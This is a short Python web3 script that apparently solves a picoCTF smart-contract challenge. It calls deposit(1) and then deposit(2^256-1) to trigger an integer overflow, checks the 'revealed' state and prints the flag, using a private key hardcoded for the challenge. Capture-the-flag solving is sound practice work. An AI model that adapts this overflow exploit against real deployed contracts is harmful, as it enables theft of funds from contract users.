from web3 import Web3

RPC_URL = "http://mysterious-sea.picoctf.net:62278"
PRIVATE_KEY = "0x1321d17be7d5158e220a5f0f35ff195513e98f4a5830008739edadc7a0fe70dc"
ACCOUNT = "0x5Ef9936dd850cE6b6b0E2797247d6267aD4F5758"
CONTRACT = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"

ABI = [
    {
        "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
        "name": "deposit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "getFlag",
        "outputs": [{"internalType": "string", "name": "", "type": "string"}],
        "stateMutability": "view",
        "type": "function",
    },
    {
        "inputs": [],
        "name": "revealed",
        "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
        "stateMutability": "view",
        "type": "function",
    },
]

w3 = Web3(Web3.HTTPProvider(RPC_URL))
assert w3.is_connected(), "RPC 連不上"

acct = w3.eth.account.from_key(PRIVATE_KEY)
contract = w3.eth.contract(address=Web3.to_checksum_address(CONTRACT), abi=ABI)

def send_tx(fn):
    nonce = w3.eth.get_transaction_count(acct.address)
    tx = fn.build_transaction({
        "from": acct.address,
        "nonce": nonce,
        "gas": 300000,
        "gasPrice": w3.eth.gas_price,
        "chainId": w3.eth.chain_id,
    })
    signed = acct.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    return receipt

print("connected:", w3.is_connected())
print("chain_id:", w3.eth.chain_id)
print("account:", acct.address)

print("[1] deposit(1)")
r1 = send_tx(contract.functions.deposit(1))
print("tx1:", r1.transactionHash.hex(), "status:", r1.status)

MAX_UINT256 = 2**256 - 1
print("[2] deposit(2^256 - 1)")
r2 = send_tx(contract.functions.deposit(MAX_UINT256))
print("tx2:", r2.transactionHash.hex(), "status:", r2.status)

print("[3] revealed =", contract.functions.revealed().call())
print("[4] flag =", contract.functions.getFlag().call())
